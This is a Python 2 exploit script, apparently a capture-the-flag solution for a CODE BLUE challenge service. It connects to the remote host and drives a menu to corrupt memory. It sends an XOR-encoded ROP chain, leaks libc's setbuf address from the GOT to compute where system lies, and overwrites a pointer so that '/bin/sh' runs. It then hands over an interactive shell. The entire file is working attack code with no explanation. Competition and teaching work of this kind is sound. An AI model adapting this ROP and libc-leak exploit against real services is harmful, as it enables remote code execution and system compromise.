import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

rop_pop1 = I(0x08048DAB)
rop_pop2 = I(0x08048DAA)
rop_puts = I(0x08048530)
rop_exit = I(0x080484D0)
rop_atoi = I(0x08048570)
devnulltxt = I(0x08048F86)
rop_read_data = I(0x080486D9)
got_setbuf = I(0x0804B00C)

rop = rop_puts + rop_pop1 + devnulltxt \
    + rop_puts + rop_pop1 + got_setbuf \
    + rop_read_data + rop_pop2 + I(0x0804B03C) + I(0x10) \
    + rop_atoi + rop_pop1 + I(0x0804B040)

rop = "".join(chr(ord(x) ^ 0xff) for x in rop)
assert "\n" not in rop
    
sc = socket.create_connection(("sms.tasks.ctf.codeblue.jp", 6029))

read_until(sc, ">")
sc.send("1\n")
sc.send("x" + "\n")

sc.send("1\n")
sc.send("x" + "\n")

sc.send("1\n")
sc.send("x" + "\n")

sc.send("1\n")
sc.send(I(1) + I(512) + "x" * 120 + "\n")

sc.send("1\n")
sc.send("x" * 12 + chr(0x24 ^ 0xff) + "xxxaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnoooo" + rop + "\n")

sc.send("3\n")
sc.send("0\n")
sc.send("-15\n")

sc.send("3\n")
sc.send("3\n")
sc.send("0\n")

sc.send("3\n")
sc.send("3\n")
sc.send("0\n")

sc.send("3\n")
sc.send("3\n")
sc.send("0\n")

sc.send("3\n")
sc.send("3\n")
sc.send("0\n")

sc.send("3\n")
sc.send("4\n")
sc.send("0\n")

sc.send("3\n")
sc.send("1\n")
sc.send("1\n")

read_until(sc, "/dev/null\n")
libc_setbuf = struct.unpack("<I", read_all(sc, 4))[0]
libc_base = libc_setbuf - 0x65450
print hex(libc_base)
libc_system = libc_base + 0x3A940

sc.send(I(libc_system) + "/bin/sh\n")

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
